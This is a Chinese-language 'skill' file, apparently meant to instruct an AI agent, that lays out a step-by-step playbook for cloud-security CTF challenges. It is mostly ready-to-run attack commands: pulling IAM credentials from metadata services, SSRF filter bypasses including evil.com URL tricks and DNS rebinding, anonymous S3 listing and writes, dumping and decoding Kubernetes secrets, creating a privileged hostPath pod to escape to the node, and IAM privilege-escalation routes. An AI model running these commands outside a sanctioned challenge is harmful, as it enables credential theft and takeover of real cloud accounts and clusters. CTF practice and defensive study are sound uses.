# 云安全攻击 Skill — CTF 云攻防题全流程指引

## 适用场景
CTF 云安全攻击类题目，包括云元数据服务利用、IAM 提权、S3 桶配置错误、容器逃逸、Kubernetes 利用等。

---

## 阶段一：云环境识别

### 1.1 判断云环境
```bash
# 检测是否在云实例中
curl -s --connect-timeout 2 http://169.254.169.254/ && echo "Cloud metadata reachable"

# AWS
curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/

# Azure
curl -s --connect-timeout 2 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# GCP
curl -s --connect-timeout 2 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/

# 阿里云
curl -s --connect-timeout 2 http://100.100.100.200/latest/meta-data/

# 检测容器环境
cat /proc/1/cgroup 2>/dev/null | grep -E "docker|kubepods|containerd"
ls /.dockerenv 2>/dev/null && echo "In Docker"
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null && echo "In K8s pod"
```

---

## 阶段二：云元数据服务利用（SSRF → 凭据窃取）

### 2.1 AWS 元数据
```bash
# 基础信息
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 获取 IAM 角色临时凭据
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE

# 输出的 AccessKeyId, SecretAccessKey, Token 可用于 AWS CLI
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# 查看当前身份
aws sts get-caller-identity

# 列出 S3 桶
aws s3 ls

# IMDSv2（需要 token）
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 2.2 SSRF 绕过技巧（针对 cloud metadata）
```bash
# IP 变体
http://169.254.169.254/         # 标准
http://[::ffff:a9fe:a9fe]/      # IPv6 映射
http://2852039166/              # 十进制 IP
http://0xa9fea9fe/              # 十六进制 IP
http://0251.0376.0251.0376/     # 八进制 IP

# DNS 重绑定
# 使用 nip.io: http://169.254.169.254.nip.io/

# URL 解析差异
http://169.254.169.254%00@evil.com/
http://evil.com@169.254.169.254/

# 重定向绕过：自建服务 302 跳转到 metadata
```

---

## 阶段三：S3 / 对象存储利用

### 3.1 S3 桶枚举
```bash
# 公开访问测试
curl -s https://BUCKET_NAME.s3.amazonaws.com/
aws s3 ls s3://BUCKET_NAME --no-sign-request

# 列出对象
aws s3 ls s3://BUCKET_NAME/ --no-sign-request --recursive

# 下载文件
aws s3 cp s3://BUCKET_NAME/flag.txt ./flag.txt --no-sign-request

# 上传测试（写权限检查）
echo "test" > /tmp/test.txt
aws s3 cp /tmp/test.txt s3://BUCKET_NAME/test.txt --no-sign-request
```

### 3.2 阿里云 OSS
```bash
# 公开访问
curl -s https://BUCKET.oss-cn-hangzhou.aliyuncs.com/

# 列出对象
curl -s "https://BUCKET.oss-cn-hangzhou.aliyuncs.com/?list-type=2"
```

---

## 阶段四：Kubernetes 攻击

### 4.1 Pod 内侦察
```bash
# Service Account Token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# 环境变量中的服务发现
env | sort
env | grep -i "SERVICE\|HOST\|PORT\|KUBERNETES"

# 访问 API Server
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"

# 测试权限
curl -sk $APISERVER/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $TOKEN"

# 列出 secrets
curl -sk $APISERVER/api/v1/namespaces/default/secrets \
  -H "Authorization: Bearer $TOKEN"

# 读取特定 secret
curl -sk $APISERVER/api/v1/namespaces/default/secrets/SECRET_NAME \
  -H "Authorization: Bearer $TOKEN" | python3 -c "
import sys,json,base64
data = json.load(sys.stdin)
for k,v in data.get('data',{}).items():
    print(f'{k}: {base64.b64decode(v).decode()}')"
```

### 4.2 创建特权 Pod 逃逸
```bash
# 如果有 create pods 权限
cat <<EOF | curl -sk $APISERVER/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" -d @-
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {"name": "pwned"},
  "spec": {
    "containers": [{
      "name": "pwned",
      "image": "ubuntu",
      "command": ["sleep", "infinity"],
      "volumeMounts": [{"name": "host", "mountPath": "/host"}],
      "securityContext": {"privileged": true}
    }],
    "volumes": [{"name": "host", "hostPath": {"path": "/"}}]
  }
}
EOF
```

---

## 阶段五：IAM 提权

### 5.1 AWS IAM 枚举
```bash
# 当前身份
aws sts get-caller-identity

# 列出 IAM 策略
aws iam list-attached-user-policies --user-name USERNAME
aws iam list-user-policies --user-name USERNAME

# 检查是否可以创建密钥
aws iam create-access-key --user-name USERNAME

# 列出角色
aws iam list-roles

# 尝试 AssumeRole
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/ROLE_NAME --role-session-name pwned
```

### 5.2 常见 IAM 提权路径
```
1. iam:CreatePolicyVersion → 修改自身策略为 admin
2. iam:AttachUserPolicy → 给自己附加 admin 策略
3. iam:PutUserPolicy → 内联 admin 策略
4. iam:CreateAccessKey → 为其他用户创建密钥
5. iam:PassRole + lambda:CreateFunction → 通过 Lambda 以高权角色执行
6. iam:PassRole + ec2:RunInstances → 启动带高权角色的 EC2
```

---

## 常见坑

| 现象 | 可能原因 | 对策 |
|------|---------|------|
| Metadata 返回 401 | IMDSv2 需要 token | 先 PUT 获取 token，再带 token 请求 |
| SSRF 无法访问 169.254.169.254 | 有 IP 过滤 | 尝试 IPv6/十进制/DNS 重绑定 |
| AWS CLI 报权限不足 | IAM 策略限制 | 枚举当前权限，找提权路径 |
| K8s API 返回 403 | ServiceAccount 权限不足 | 检查 RBAC，找其他 SA token |
| 容器内无工具 | 精简镜像 | 用 curl + shell 替代，或上传静态二进制 |
